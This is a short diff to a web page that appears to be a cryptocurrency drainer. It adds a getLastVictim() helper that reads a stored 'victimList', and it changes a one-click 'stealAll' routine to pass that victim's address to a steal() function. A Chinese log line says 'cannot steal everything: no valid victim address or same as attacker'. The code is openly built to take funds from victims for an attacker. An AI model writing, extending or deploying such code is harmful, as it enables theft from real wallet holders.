@@ -106,8 +106,13 @@ async function steal() {
 }
 
 async function stealAll() {
+  const lastVictim = getLastVictim();
+  if (!lastVictim || lastVictim.toLowerCase() === attacker.toLowerCase()) {
+    log("❌ 無法一鍵盜光：無有效受害者地址或與攻擊者相同");
+    return;
+  }
   await getMax();
-  await steal();
+  await steal(lastVictim);
 }
 
 function log(msg) {
@@ -149,3 +154,13 @@ window.addEventListener("load", renderRecentList);
 </script>
 </body>
 </html>
+
+<script>
+
+function getLastVictim() {
+  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
+  if (list.length === 0) return null;
+  return list[0].split(" ")[0];
+}
+
+</script>
